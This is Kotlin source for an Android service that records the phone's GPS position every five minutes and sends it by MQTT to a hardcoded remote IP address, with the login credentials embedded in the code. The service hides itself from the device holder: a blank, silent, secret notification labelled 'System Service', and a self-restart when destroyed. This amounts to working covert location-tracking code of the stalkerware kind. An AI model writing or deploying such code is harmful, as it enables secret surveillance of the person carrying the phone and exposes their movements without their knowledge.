package com.ars.gpslogger

import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class GpsLoggerService : Service() {

    companion object {
        const val TAG = "GpsLogger"
        const val MQTT_HOST      = "tcp://144.24.113.211:1883"
        const val MQTT_USER      = "ars"
        const val MQTT_PASS      = "@r\$"
        const val MQTT_TOPIC     = "gps/phone1"
        const val DEVICE_ID      = "phone1"
        const val GPS_INTERVAL_MS    = 5 * 60 * 1000L   // 5 minutes
        const val UPLOAD_INTERVAL_MS = 6 * 60 * 1000L   // 6 minutes
        const val CHANNEL_ID     = "gps_service"
        const val NOTIF_ID       = 1
    }

    private lateinit var handler: Handler
    private lateinit var db: GpsDatabase

    private val gpsRunnable = object : Runnable {
        override fun run() {
            captureLocation()
            handler.postDelayed(this, GPS_INTERVAL_MS)
        }
    }

    private val uploadRunnable = object : Runnable {
        override fun run() {
            uploadPending()
            handler.postDelayed(this, UPLOAD_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        db = GpsDatabase(this)
        handler = Handler(Looper.getMainLooper())
        createNotificationChannel()
        startForegroundCompat()
        handler.post(gpsRunnable)
        handler.postDelayed(uploadRunnable, UPLOAD_INTERVAL_MS)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(gpsRunnable)
        handler.removeCallbacks(uploadRunnable)
        startService(Intent(applicationContext, GpsLoggerService::class.java))
    }

    private fun captureLocation() {
        try {
            if (ContextCompat.checkSelfPermission(
                    this, android.Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED) return

            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = listOf(
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER
            )
            var best: Location? = null
            for (p in providers) {
                if (lm.isProviderEnabled(p)) {
                    val loc = lm.getLastKnownLocation(p)
                    if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                }
            }
            if (best != null) {
                val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                    .apply { timeZone = TimeZone.getTimeZone("UTC") }
                    .format(Date(best.time))
                db.insert(best.latitude, best.longitude, best.altitude, best.accuracy.toDouble(), ts)
                Log.d(TAG, "Captured: ${best.latitude}, ${best.longitude}")
                uploadPending()
            }
        } catch (e: Exception) {
            Log.e(TAG, "GPS error: ${e.message}")
        }
    }

    private fun uploadPending() {
        if (!isOnline()) return
        val pending = db.getPending()
        if (pending.isEmpty()) return
        try {
            val client = MqttClient(MQTT_HOST, DEVICE_ID, MemoryPersistence())
            val options = MqttConnectOptions().apply {
                userName = MQTT_USER
                password = MQTT_PASS.toCharArray()
                isCleanSession = true
                connectionTimeout = 15
                keepAliveInterval = 30
            }
            client.connect(options)
            for (row in pending) {
                val payload = JSONObject().apply {
                    put("lat", row.lat); put("lon", row.lon)
                    put("alt", row.alt); put("acc", row.acc)
                    put("ts", row.ts);   put("dev", DEVICE_ID)
                }.toString()
                client.publish(MQTT_TOPIC, MqttMessage(payload.toByteArray()).apply { qos = 1 })
                db.markUploaded(row.id)
            }
            client.disconnect()
        } catch (e: Exception) {
            Log.e(TAG, "MQTT error: ${e.message}")
        }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val net = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(net) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startForegroundCompat() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setShowWhen(false).setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIF_ID, notification)
        }
    }
}
